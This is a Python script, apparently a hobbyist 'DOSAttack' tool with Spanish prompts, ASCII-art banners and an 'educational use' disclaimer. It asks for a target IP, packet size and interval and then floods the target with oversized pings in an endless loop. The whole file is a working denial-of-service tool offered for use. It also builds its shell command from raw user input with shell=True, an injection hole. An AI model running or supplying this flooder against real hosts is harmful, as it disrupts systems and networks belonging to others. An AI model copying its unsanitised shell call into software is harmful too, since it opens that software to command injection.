#!/bin/python3
import subprocess, sys, signal, os, platform, socket, time

# Banners
banner = """
===================================================================================
        No me hago responsable de los daños causados con esta herramienta.        
 Esta herramienta está diseñada para fines educativos y bajo un entorno controlado 

  ▓█████▄  ▒█████    ██████  ▄▄▄     ▄▄▄█████▓▄▄▄█████▓ ▄▄▄       ▄████▄   ██ ▄█▀
  ▒██▀ ██▌▒██▒  ██▒▒██    ▒ ▒████▄   ▓  ██▒ ▓▒▓  ██▒ ▓▒▒████▄    ▒██▀ ▀█   ██▄█▒ 
  ░██   █▌▒██░  ██▒░ ▓██▄   ▒██  ▀█▄ ▒ ▓██░ ▒░▒ ▓██░ ▒░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ 
  ░▓█▄   ▌▒██   ██░  ▒   ██▒░██▄▄▄▄██░ ▓██▓ ░ ░ ▓██▓ ░ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ 
  ░▒████▓ ░ ████▓▒░▒██████▒▒ ▓█   ▓██▒ ▒██▒ ░   ▒██▒ ░  ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄
   ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░ ▒▒   ▓▒█░ ▒ ░░     ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒
   ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░  ▒   ▒▒ ░   ░        ░      ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░
   ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░    ░   ▒    ░        ░        ░   ▒   ░        ░ ░░ ░ 
     ░        ░ ░        ░        ░  ░                       ░  ░░ ░      ░  ░   
   ░                                                             ░               

Auth ~->> Erick Garcia M.
Github ~->> github.com/zackk03
Youtube ~->> youtube.com/channel/UCeJOzCokicB8RWXmckFBKNg
===================================================================================
"""

info = """

La información sobre el host, el tamaño del paquete o el intervalo, no fueron correctos.
Por favor verifica de nuevo los valores introducidos. Aquí hay más información acerca...

uso: ./DOSAttack.py 

options: 
    Host Objetivo           Este es la dirección IP de la máquina víctima.

    Size de los Paquetes    Aquí especificaremos el tamaño de los paquetes
                            que vamos a enviar. El tamaño de los paquetes
                            se especifica en Bytes.

    Invervalo               Aquí vamos especificar el intervalo de tiempo
                            en el que se van a enviar los paquetes. Por 
                            ejemplo 0.1 (10 paquetes por segundo), 0.01
                            (100 pequetes por segundo), 0.001 (1000 pequetes
                            por segundo)...


"""

# Error de conexion
def errorconect(host,ip):
    errorconect = f"""
███████╗ █████╗ ██╗██╗     ███████╗██████╗ 
██╔════╝██╔══██╗██║██║     ██╔════╝██╔══██╗
█████╗  ███████║██║██║     █████╗  ██║  ██║
██╔══╝  ██╔══██║██║██║     ██╔══╝  ██║  ██║
██║     ██║  ██║██║███████╗███████╗██████╔╝
╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝ 
                                           
 [!] PING {ip} ({host}) failed...

>>=-------------- {ip} ping statistics --------------=<<
1 packets transmitted, 0 received, 100% packet loss, time 0ms


[!] No se ha podido establecer una conexión con el objetivo...

    """
    clear()
    print(errorconect)

def charging():
    progressbar = """
    [*] Cargando [..............................] 0%
    """
    progressbar1 = """
    [*] Cargando [========>.....................] 25% 
    """
    progressbar2 = """
    [*] Cargando [================>.............] 50% 
    """
    progressbar3 = """
    [*] Cargando [========================>.....] 75% 
    """
    progressbar4 = """
    [*] Cargando [=============================>] 100% 
    """
    clear()
    print(progressbar)
    time.sleep(0.5)
    clear()
    print(progressbar1)
    time.sleep(0.1)
    clear()
    print(progressbar2)
    time.sleep(0.1)
    clear()
    print(progressbar3)
    time.sleep(0.1)
    clear()
    print(progressbar4)
    time.sleep(0.5)

# Función para controlar el borrado de la terminal segun el sistema
def clear():
    if platform.system() == 'Linux':
        os.system("clear")
    elif platform.system() == 'Windows':
        os.system("cls")
    elif platform.system() == 'Darwin':
        os.system("clear")

# Controlar el flujo de ejecución Ctrl + C
def handle(sig, frame):
	print("\n\n[!] Saliendo...\n")
	sys.exit(1) 

signal.signal(signal.SIGINT, handle)

# Realizamos el ping
def myping():
    clear()
    print(banner)
    host = input("Host Objetivo >> ")
    size = input("Size de los paquetes >> ")
    intervalo = input("intervalo de tiempo >> ")

    # parametro segun sistemas
    #parametro = "-n" if platform.system() == "Windows" else "-c"
    parametrosize = "-s" if platform.system() == "Linux" else "-l"
    parainfinity = "-t" if platform.system() == "Windows" else ""

    if host == "" or size == "" or intervalo == "":
        clear()
        print(info)
    else:

        # Lanzamos ping para comprobar si tenemos conexión
        # Confirmacion de conexion con el host
        clear()
        print("\n [*] Comprobando la conexión con el objetivo...\n")
        time.sleep(3)
        commando = ['ping', '-c', '1', host]
        proceso = subprocess.run(commando)
        socket.gethostname()
        charging()
        time.sleep(2)

        # Una vez comprobado, lanzamos el ataque!
        if proceso.returncode == 0:
            clear()
            while proceso.returncode == 0:
                subprocess.run(f"ping -s {size} -i {intervalo} {host}", shell=True)
        else:
            errorconect(socket.gethostname(),host)


# inicializacion del programa
if __name__ == '__main__':
    myping()
